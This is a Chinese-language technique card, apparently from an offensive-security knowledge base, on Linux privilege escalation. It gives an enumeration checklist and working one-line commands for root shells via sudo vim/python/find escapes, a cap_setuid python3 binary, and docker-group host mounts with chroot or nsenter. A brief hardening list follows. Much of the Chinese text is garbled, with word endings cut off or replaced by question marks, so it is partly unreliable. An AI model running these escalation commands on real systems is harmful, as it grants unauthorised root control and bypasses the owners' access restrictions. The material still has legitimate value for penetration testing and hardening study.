# Linux Privilege Escalation Techniques

**ID**: `linux-priv-esc-001` | **分类**: linux | **风险等级**: critical

Linux 权限提升技术用于在获取普通用户访问权限后提升?root。Linux 系统存在多种提权路径：sudo 配置错误、SUID 二进制滥用、危险的 Capability 配置、可?cron 任务、内核漏洞等。提权成功取决于系统配置和用户权限

## 触发场景

- 获取普通用?shell 后需要提升到 root
- 发现 sudo 配置不当可执行特权命
- 发现 SUID 二进制文件可被滥
- 发现可写?cron 任务或脚
- 发现危险?Linux Capability 配置

## 操作检查清单

1. 检?sudo 权限 (sudo -l)
2. 查找 SUID 二进?(find / -perm -4000)
3. 检查用户组 (id)
4. 检?cron 任务 (crontab -l, ls -la /etc/cron*)
5. 检?Capability (getcap -r / 2>/dev/null)
6. 检查可写配置文?(/etc/passwd, /etc/shadow)
7. 检查环境变
8. 检查内核版本和可用 exploit
9. 使用 LinPEAS 自动化枚?

## 技术手段

- sudo 命令滥用 (GTFOBins)
- SUID 二进制利
- Capability 滥用 (cap_setuid, cap_sys_ptrace)
- cron 任务劫持
- 环境变量劫持 (PATH, LD_PRELOAD)
- Docker/LXD 组成员提
- 内核漏洞利用
- 可写 /etc/passwd 利用

## 症状

- 用户可通过 sudo 执行特定命令
- 系统存在 SUID root 二进制文
- 用户具有危险?Linux Capability
- cron 任务?root 运行但脚本可
- 用户属于 docker 或其他特权组

## 根因分析

- sudoers 配置允许 NOPASSWD 执行危险命令
- SUID 二进制存在已知可利用行为
- Linux Capability 分配过于宽松
- cron 脚本权限配置不当
- 用户被加入特权组 (docker, lxd)
- 内核存在可利用的本地提权漏洞

## 示例

### sudo vim 提权

利用 sudo 允许运行 vim 的特权执?shell

```
# sudo 允许运行 vim
sudo vim -c ':!/bin/sh'

# 或使?python
sudo python -c 'import os; os.system("/bin/sh")'

# 或使?find
sudo find /etc/passwd -exec /bin/sh \;
```

### Capability cap_setuid 提权

利用 cap_setuid capability 获取 root

```
# 发现具有 cap_setuid 的二进制
getcap -r / 2>/dev/null
# 输出: /usr/bin/python3 = cap_setuid+ep

# 利用 python3 提权
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

### Docker 组成员提

利用 docker 组成员身份挂载宿主机文件系统

```
# docker 组成员可控制 docker daemon
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# 或使用特权容器
docker run --rm -it --privileged --pid=host \
  -v /:/mnt alpine nsenter -t 1 -m -u -n -i sh
```

## 成功标志

- 成功获取 root shell
- 可以修改系统配置
- 可以读取敏感文件

## 防御建议

- 严格配置 sudoers 使用 visudo
- 定期审计 SUID 二进
- 最小化 Linux Capability 分配
- 保护 cron 脚本权限
- 限制特权组成
- 及时更新内核和系统补
- 使用 AppArmor/SELinux 限制进程权限
